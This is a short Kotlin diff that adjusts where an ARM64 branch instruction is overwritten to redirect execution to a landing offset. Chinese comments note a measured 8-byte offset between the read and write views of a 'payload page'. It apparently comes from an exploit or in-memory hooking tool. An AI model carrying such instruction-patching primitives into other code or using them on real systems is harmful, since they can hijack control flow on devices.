@@ -143,8 +143,13 @@ class Assembled43284(
             return -1
         }
         val branchAt = siteOffset + 12L              /* the B instruction own address */
-        val blockAt = branchAt - (branchAt % 16L)   /* the 16-byte unit that holds it */
-        val within = (branchAt - blockAt).toInt()
+        /*
+         * 真机实测（载荷页单点实验）：读(offset) 等于 内存(offset + 8)，读视图超前 8 字节。
+         * 于是要让读侧那个 branchAt 被改写，写侧就必须落在 branchAt 减 8。
+         */
+        val writeAt = branchAt - 8L
+        val blockAt = writeAt - (writeAt % 16L)     /* the 16-byte unit that holds it */
+        val within = (writeAt - blockAt).toInt()
         val block = readBlock(ticket, blockAt) ?: return -2
         val delta = landingOffset - branchAt
         val imm = ((delta shr 2) and 0x03FFFFFFL).toInt()
